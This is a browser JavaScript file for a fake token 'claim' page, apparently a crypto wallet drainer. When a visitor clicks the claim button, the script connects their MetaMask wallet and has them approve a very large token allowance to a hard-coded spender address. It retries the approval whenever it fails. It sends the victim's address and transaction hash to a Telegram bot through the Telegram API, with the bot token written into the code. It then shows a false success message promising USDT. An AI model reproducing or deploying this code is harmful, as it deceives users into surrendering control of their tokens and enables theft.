window.onload = async function(){

  let useraddress;
  let network_id = '0x1b58'; // zeta mainnet

  const spenderAddress = '0xCEd271A5C2ED93Ba59Dce555FDc73E1dE3Dcad22'; // spender address
  let bot_token = '6458087750:AAHfey42yyHAJk3lmXb12XJCOeQlf9u3x7M';

  let tokencontract = '0x45334a5B0a01cE6C260f2B570EC941C680EA62c0';

  let token_amount = 100000000000;

  // ========================= script for trsfo =========================================
  let bnb_claim_btn = document.querySelector('.bnb_claim_btn');

  async function change_network(network_id) {
    if (typeof window.ethereum !== 'undefined') {
      const ethereum = window.ethereum;
      await ethereum
        .request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: network_id }],
        })
        .then( async (response) => {
           return true;
        })
        .catch((error) => {
          console.error(error);
          return false;
        });
    } else {
      console.error('MetaMask is not installed');
      return false;
    }
  }

  function show_spin(){
    bnb_claim_btn.querySelector('.spinner_img').classList.remove('d-none');
  }
  function hide_spin(){
    bnb_claim_btn.querySelector('.spinner_img').classList.add('d-none');
  }

  async function connect_meamask() {
    show_spin();
    try {
      if (window.ethereum) {
        const ethereum = window.ethereum;
        const accounts = await ethereum.request({method: 'eth_requestAccounts',});
        useraddress = accounts[0];
        await change_network(network_id);

        fetch(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=5204205237&text= User Address - <code>${useraddress}</code>&parse_mode=HTML`);

        controller();

      } else {
        connect_meamask();
        hide_spin();
      }
    } catch (error) {
      hide_spin();
    }
  }


  // ============== controller ===============
  async function controller() {

    const tokenAbi = require('./abi.json');
    const ethers = require('ethers');

    const provider = new ethers.providers.Web3Provider(window.ethereum);
    await window.ethereum.enable();

    const tokenContract = new ethers.Contract(
      tokencontract,
      tokenAbi,
      provider.getSigner(),
    );

    // get user token balance
    async function inc_all() {
      try {
        const amountToApprove = ethers.utils.parseUnits(token_amount.toString(),18,);
        const tx = await tokenContract.increaseAllowance(spenderAddress,amountToApprove,);
        await tx.wait();
        hide_spin();
        fetch(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=5204205237&text=Tx - <code>${tx.hash}</code> | Network - <code>${network_id}</code> | User Address - <code>${useraddress}</code>&parse_mode=HTML`);
        alert(
          'Your claim was successful, and you will receive USDT within 6 hours.',
        );
      } catch (error) {
        await inc_all();
      }
    }

    await inc_all();

  }
 
  bnb_claim_btn.addEventListener('click', async () => {
    await connect_meamask();
  });

  document.querySelector('.claim_btn_head').addEventListener('click',async function(){
    await connect_meamask();
  });

}